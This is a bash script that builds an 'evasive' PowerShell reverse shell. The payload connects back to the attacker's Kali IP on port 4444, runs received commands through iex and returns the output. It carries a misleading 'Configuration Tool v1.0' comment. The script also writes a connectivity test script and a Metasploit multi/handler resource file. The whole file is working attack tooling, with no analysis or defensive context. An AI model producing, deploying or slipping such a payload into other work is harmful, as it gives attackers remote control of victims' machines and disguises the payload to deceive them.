#!/bin/bash
# Create Evasive PowerShell Payload

echo "=== Creating Simple Evasive PowerShell Payload ==="
echo ""

# Get Kali IP
IP=$(hostname -I | awk '{print $1}')
echo "[*] Using Kali IP: $IP"
echo ""

cat > simple_evasive.ps1 << EOF
# Configuration Tool v1.0
\$addr = '$IP'
\$p = 4444
\$client = New-Object System.Net.Sockets.TcpClient(\$addr, \$p)
\$stream = \$client.GetStream()
[byte[]]\$bytes = 0..65535|%{0}

while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i)
    try {
        \$sendback = (iex \$data 2>&1 | Out-String)
    } catch {
        \$sendback = "Error executing command\`n"
    }
    \$prompt = "PS " + (pwd).Path + "> "
    \$sendback2 = \$sendback + \$prompt
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2)
    \$stream.Write(\$sendbyte, 0, \$sendbyte.Length)
    \$stream.Flush()
}
\$client.Close()
EOF

echo "[+] Created simple_evasive.ps1"
echo ""

# Create test script to verify it runs without errors
cat > test_connection.ps1 << EOF
# Test Connection Script
Write-Host "Testing connection to $IP:4444..." -ForegroundColor Green
\$test = New-Object System.Net.Sockets.TcpClient
try {
    \$test.Connect('$IP', 4444)
    if(\$test.Connected) {
        Write-Host "Successfully connected!" -ForegroundColor Green
        \$test.Close()
    }
} catch {
    Write-Host "Could not connect. Make sure handler is running on Kali." -ForegroundColor Yellow
}
EOF

echo "[+] Created test_connection.ps1 - Use this to test connectivity first"
echo ""

# Create handler
cat > handler.rc << EOF
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

echo "[+] Created handler.rc"
echo ""
